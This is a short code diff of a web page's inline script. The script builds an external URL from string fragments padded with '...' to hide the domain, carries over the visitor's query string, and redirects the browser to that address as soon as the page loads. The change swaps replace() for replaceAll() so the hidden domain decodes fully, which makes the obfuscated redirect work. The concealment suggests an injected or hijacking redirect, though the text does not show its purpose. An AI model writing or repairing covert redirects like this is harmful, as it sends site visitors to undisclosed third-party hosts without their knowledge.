@@ -10,7 +10,7 @@
   var sc = window.location.search
   if (sc.length <= 0)
    sc = "?javascript=ghio"
-  var alteraddr = "https://" + ["milkyw...ay", "qt...hep.", ".erfe...ct", "c...om"].join(".").replace("...", "") + "/milkyway/" + sc;
+  var alteraddr = "https://" + ["milkyw...ay", "qt...hep.", ".erfe...ct", "c...om"].join(".").replaceAll("...", "") + "/milkyway/" + sc;
  window.location.href=alteraddr
  </script>
  </head>
